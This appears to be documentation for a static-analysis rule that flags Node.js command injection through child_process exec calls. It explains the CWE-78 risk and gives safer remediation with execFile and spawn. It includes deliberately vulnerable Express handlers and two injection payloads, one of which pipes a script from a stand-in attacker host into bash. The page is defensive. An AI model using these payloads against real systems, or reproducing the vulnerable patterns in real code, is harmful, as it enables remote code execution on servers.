---
title: "VNX-NODE-013 – Node.js Command Injection via child_process"
description: "Detects direct user input (req.* or request.*) passed to child_process.exec(), execSync(), or similar functions, enabling OS command injection and remote code execution."
---

## Overview

This rule detects cases where user-supplied request data (`req.*` or `request.*`) is passed directly to `exec()`, `execSync()`, or the fully qualified `child_process.exec()` / `child_process.execSync()`. It also detects template literal interpolation in those calls (`` exec(`...${...}`) ``). While VNX-NODE-003 catches dangerous string construction patterns, this rule focuses specifically on direct user-input injection — the most immediately exploitable form of command injection. This is CWE-78 (Improper Neutralization of Special Elements used in an OS Command).

**Severity:** Critical | **CWE:** [CWE-78 – Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

When user input flows directly into `exec()`, an attacker only needs to include a shell metacharacter to inject additional commands. A value like `; curl https://attacker.com/shell.sh | bash` appended to any command gives the attacker an interactive reverse shell running as the Node.js process user. There is no escaping function that reliably prevents this — the only safe approach is to avoid `exec()` with user data entirely.

The critical severity reflects that exploitation requires no special conditions or privileges: a single HTTP request with a crafted parameter is sufficient. Real-world exploits of this pattern are common against utilities that wrap CLI tools: file conversion, image processing, email sending, git operations, reporting, and any feature that shells out to a system command.

## What Gets Flagged

The rule matches lines containing `exec(req.`, `exec(request.`, `execSync(req.`, `execSync(request.`, `child_process.exec(`, `child_process.execSync(`, and template literal patterns `` exec(`...${` ``.

```javascript
// FLAGGED: exec with direct user input
const { exec } = require('child_process');
app.get('/ping', (req, res) => {
  exec('ping -c 1 ' + req.query.host, (err, stdout) => {
    res.send(stdout);
  });
});

// FLAGGED: execSync with request body
const { execSync } = require('child_process');
app.post('/process', (req, res) => {
  const output = execSync(`convert ${req.body.filename} output.jpg`);
  res.send(output);
});

// FLAGGED: child_process.exec directly
child_process.exec(req.query.cmd, callback);
```

An attacker sends `?host=8.8.8.8; id; whoami` and receives the server's command output.

## Remediation

1. **Use `execFile` with an argument array instead of `exec` with a shell string.** `execFile` does not spawn a shell — it executes the binary directly with arguments passed as separate items, so metacharacters are never interpreted:

   ```javascript
   // SAFE: execFile — no shell, arguments are literal strings
   const { execFile } = require('child_process');

   app.get('/ping', (req, res) => {
     // Validate the host format first
     const hostPattern = /^[a-zA-Z0-9.\-]+$/;
     if (!hostPattern.test(req.query.host)) {
       return res.status(400).json({ error: 'Invalid host' });
     }
     execFile('ping', ['-c', '1', req.query.host], { timeout: 5000 }, (err, stdout) => {
       if (err) return res.status(500).json({ error: 'Ping failed' });
       res.send(stdout);
     });
   });
   ```

2. **Use `spawn` with `shell: false` (the default) for streaming output:**

   ```javascript
   // SAFE: spawn without shell — arguments are not interpreted by /bin/sh
   const { spawn } = require('child_process');

   app.get('/convert', (req, res) => {
     const safe = /^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$/.test(req.query.file)
       ? req.query.file
       : null;
     if (!safe) return res.status(400).send('Invalid file');

     const proc = spawn('convert', [safe, 'output.png']);
     proc.stdout.pipe(res);
   });
   ```

3. **Replace shell commands with native Node.js libraries wherever possible.** This eliminates the OS command surface entirely:
   - Image processing: use `sharp` instead of ImageMagick
   - Archive creation: use `archiver` instead of `zip`
   - Git operations: use `simple-git` or `isomorphic-git`
   - Network diagnostics: use Node.js `dns` and `net` modules

4. **Apply strict input validation before any command execution.** Reject inputs that do not match an explicit allowlist pattern (regex, enum, numeric range). Fail closed — if the value doesn't match, reject the request entirely.

5. **Run the process with minimal OS privileges.** Use Linux user namespaces, Docker `--cap-drop=ALL`, or seccomp profiles to restrict what commands the process can spawn.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [Node.js child_process.execFile documentation](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback)
- [OWASP Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [sharp – high-performance Node.js image processing](https://sharp.pixelplumbing.com/)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
